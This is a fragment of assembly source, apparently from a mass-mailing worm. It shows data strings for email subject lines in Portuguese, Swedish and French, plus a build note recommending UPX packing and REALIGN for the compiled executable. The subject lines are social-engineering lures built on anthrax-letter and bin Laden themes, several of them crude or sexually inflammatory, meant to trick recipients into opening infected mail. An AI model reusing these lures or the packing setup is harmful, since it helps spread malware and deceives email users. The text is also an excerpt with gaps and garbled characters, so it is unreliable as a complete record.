...
por_subject4   db 'Serß que o Osama Θ mal-amado ?  ',0
por_subject5   db 'EUA agride convenτao de genova ?',0
por_subject6   db 'Antraz pelo correio (verdade)   ',0
por_subject7   db 'Armas biologicas: Previna-se !  ',0
por_subject8   db 'Fudendo um mulß em Islamabad  ',0

swe_subject1   db 'Bin Landen Toalettpapper        ',0
swe_subject2   db 'Sadam hussein & BinLaden Σr f÷rΣlskade',0
swe_subject3   db 'Bush knullar Bin Laden hσrt <:P ',0
swe_subject4   db 'Σr Osama Bin Laden inte Σlskad ?',0
swe_subject5   db '─r USA emot Geneve ÷verenskommelsen ? ',0
swe_subject6   db 'Anthrax brevet existerar(det Σr inget skΣmt)',0
swe_subject7   db 'Biologiska vapen: F÷rhindra !   ',0
...
fre_subject3   db 'Bush nique α donf Bin Laden <:P ',0
fre_subject4   db 'Osama Bin Laden Mal AimΘ ?      ',0
fre_subject5   db 'Usa contre la convention de Geneve?',0
fre_subject6   db 'Le courrier Anthrax existe vraiment',0
fre_subject7   db 'Arme Biologique: PrΘventions!   ',0
fre_subject8   db 'Baiser un mullah α Islamabad    ',0
...
::C:\TASM\BIN\REALIGN.EXE source.EXE
rem - melhor configuracao Θ upx e depois realign
──────────────────────────────────────────────────────────────[COMPILE.BAT]───
